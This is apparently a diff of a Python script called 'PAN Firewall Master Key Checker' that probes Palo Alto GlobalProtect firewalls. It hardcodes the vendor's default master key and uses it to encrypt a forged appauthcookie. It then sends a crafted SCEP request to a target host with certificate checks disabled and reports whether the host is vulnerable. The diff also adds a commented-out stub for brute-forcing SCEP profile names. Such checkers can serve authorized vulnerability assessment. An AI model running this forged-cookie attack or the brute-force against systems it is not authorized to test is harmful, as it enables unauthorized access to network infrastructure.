@@ -16,10 +16,10 @@
 from hashlib import md5, sha1
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-from base64 import b64encode, b64decode
+from base64 import b64encode
 import sys, time, struct
 import requests
-from requests_toolbelt import MultipartEncoder
+
 
 # The default master key used by Palo Alto GlobalProtect
 DEFAULT_MASTERKEY = b"p1a2l3o4a5l6t7o8"
@@ -38,6 +38,14 @@ def banner():
     print("                                                 ")
     print(" PAN Firewall Master Key Checker                 ")
     print("                                                 ")
+
+
+# Global variables. Change as you see fit.
+
+email = "test@test.com"
+user = "test"
+hostid = "test"
+spn = "test"
 
 
 # Do all the heavy crypto work here
@@ -68,19 +76,33 @@ class PanCrypt:
 
 
 def getPayload(spn):
-    email = b"test@test.test"
-    user = b"test"
-    hostid = b"test"
+
+    # https://docs.paloaltonetworks.com/pan-os/9-1/pan-os-admin/certificate-management/obtain-certificates/deploy-certificates-using-scep
+
+    email_encoded = bytes(email, "utf-8")
+    user_encoded = bytes(user, "utf-8")
+    hostid_encoded = bytes(hostid, "utf-8")
+
     # Initially it used bytes(int(time.time())) but that generated a 2gb data payload and borked requests.
     # Working with @largecardinal, we found this approach generates a proper sized payload of 207 bytes
-    expiry = struct.pack("<L", int(time.time() + 1000000))
-    token_pt = b":".join((expiry, user, hostid))
+    # The timestamp should be a textual unix timestamp
+    expiry = str(int(time.time()) + 1000000).encode()
+    token_pt = b":".join((expiry, user_encoded, hostid_encoded))
     token = PanCrypt().encrypt(token_pt)
     return (
         "scep-profile-name={}&user-email={}&user={}&host-id={}&appauthcookie={}".format(
             spn, email, user, hostid, token
         )
     )
+
+
+# The scep-profile-name= could be bruteforced and this is what we shall attempt to do
+# def bruteForce(spn):
+
+#     # we shall hardcode the spn's here for now
+#     bruteforce_list = open("spn.txt", "r")
+#     counter = 0
+#     for i in bruteforce_list:
 
 
 # Responses from the target server
@@ -104,7 +126,7 @@ def classify(resp):
     for i in resps:
         if i in resp:
             return resps[i]
-    return "unknown"
+    return "Something went wrong"
 
 
 # Main function
@@ -132,13 +154,17 @@ if __name__ == "__main__":
 
     if "http" not in host:
         host = "https://" + host
+
+    # If the master key is in use, this request should return a message called "Unable to find the configuration". This means SCEP isn't enabled
+
     r = requests.get(
         host,
         data=data,
         headers={"content-type": "application/x-www-form-urlencoded"},
         verify=False,
     )
-   # Handle the response from the server
+
+    # Handle the response from the server
     print("[*] Raw response from the server: {}".format(r.text))
 
-    print((classify(r.text)))
+    print("[*] Is it vulnerable?: {}".format(classify(r.text)))
